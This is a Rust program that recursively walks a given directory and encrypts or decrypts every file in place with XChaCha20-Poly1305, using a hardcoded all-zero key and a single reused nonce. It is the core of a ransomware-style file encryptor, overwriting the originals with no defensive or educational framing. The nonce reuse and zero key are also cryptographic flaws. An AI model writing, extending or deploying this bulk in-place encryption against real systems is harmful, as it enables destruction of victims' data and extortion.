use std::{
    env,
    fs::{self, read_dir},
    path::{Path, PathBuf},
};

use anyhow::anyhow;
use chacha20poly1305::{
    aead::{Aead, NewAead},
    XChaCha20Poly1305,
};

const KEY: [u8; 32] = [
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
];
const NONCE: [u8; 24] = [
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
];

fn recurse(path: impl AsRef<Path>) -> Vec<PathBuf> {
    let Ok(entries) = read_dir(path) else { return vec![] };
    entries
        .flatten()
        .flat_map(|entry| {
            let Ok(meta) = entry.metadata() else { return vec![] };
            if meta.is_dir() {
                return recurse(entry.path());
            }
            if meta.is_file() {
                return vec![entry.path()];
            }
            vec![]
        })
        .collect()
}

fn main() {
    let args: Vec<String> = env::args().collect();
    let query = &args[1];
    let path = &args[2];

    let files = recurse(path);
    files.iter().for_each(|f| {
        if "-e" == query {
            encrypt_small_file(&f, &f, &KEY, &NONCE).ok();
        } else if "-d" == query {
            decrypt_small_file(&f, &f, &KEY, &NONCE).ok();
        }
    });
}

fn encrypt_small_file(
    filepath: &PathBuf,
    dist: &PathBuf,
    key: &[u8; 32],
    nonce: &[u8; 24],
) -> Result<(), anyhow::Error> {
    let cipher = XChaCha20Poly1305::new(key.into());

    let file_data = fs::read(filepath)?;

    let encrypted_file = cipher
        .encrypt(nonce.into(), file_data.as_ref())
        .map_err(|err| anyhow!("Encrypting small file: {}", err))?;

    fs::write(&dist, encrypted_file)?;

    Ok(())
}

fn decrypt_small_file(
    encrypted_file_path: &PathBuf,
    dist: &PathBuf,
    key: &[u8; 32],
    nonce: &[u8; 24],
) -> Result<(), anyhow::Error> {
    let cipher = XChaCha20Poly1305::new(key.into());

    let file_data = fs::read(encrypted_file_path)?;

    let decrypted_file = cipher
        .decrypt(nonce.into(), file_data.as_ref())
        .map_err(|err| anyhow!("Decrypting small file: {}", err))?;

    fs::write(&dist, decrypted_file)?;

    Ok(())
}
